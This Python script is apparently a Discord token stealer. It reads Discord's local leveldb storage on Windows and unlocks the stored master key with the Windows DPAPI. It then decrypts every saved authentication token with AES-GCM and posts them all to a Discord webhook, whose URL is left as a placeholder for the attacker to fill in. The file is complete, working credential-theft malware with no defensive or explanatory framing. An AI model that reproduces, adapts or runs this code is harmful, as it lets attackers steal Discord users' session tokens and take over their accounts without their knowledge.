from os import environ, listdir
from os.path import exists
from sys import exit
from re import findall
from base64 import b64decode
from Crypto.Cipher import AES
from json import loads
from win32crypt import CryptUnprotectData
from discord import SyncWebhook
path = rf'{environ["APPDATA"]}\discord\Local Storage\leveldb'
path_mk = rf'{environ["APPDATA"]}\discord\Local State'
regexpath_enc = r"dQw4w9WgXcQ:[^\"]*"
if not exists(path):
    exit()
t_list = []
for file in listdir(path):
    if not file.endswith(".ldb") and not file.endswith(".log"):
        continue
    with open(rf'{path}\{file}', errors='ignore') as f:
        lines = f.read().splitlines()
    for line in lines:
        for enc_t in findall(regexpath_enc, line):
            plain_t = b64decode(enc_t.split('dQw4w9WgXcQ:')[1])
            with open(path_mk, "r", encoding="utf-8") as f:
                local_state_content = f.read()
            json_local_state = loads(local_state_content)
            m_k = b64decode(json_local_state["os_crypt"]["encrypted_key"])
            m_k = m_k[5:]
            m_k = CryptUnprotectData(m_k, None, None, None, 0)[1]
            iv = plain_t[3:15]
            payload = plain_t[15:]
            cipher = AES.new(m_k, AES.MODE_GCM, iv)
            dec_pass = cipher.decrypt(payload)
            token = dec_pass[:-16].decode()
            t_list.append(token)
msg = ""
for tab in t_list:
    msg = msg + tab + "\n"
botconnect = SyncWebhook.from_url("REPLACE_THIS_WITH_WEBHOOK_URL")
botconnect.send(msg)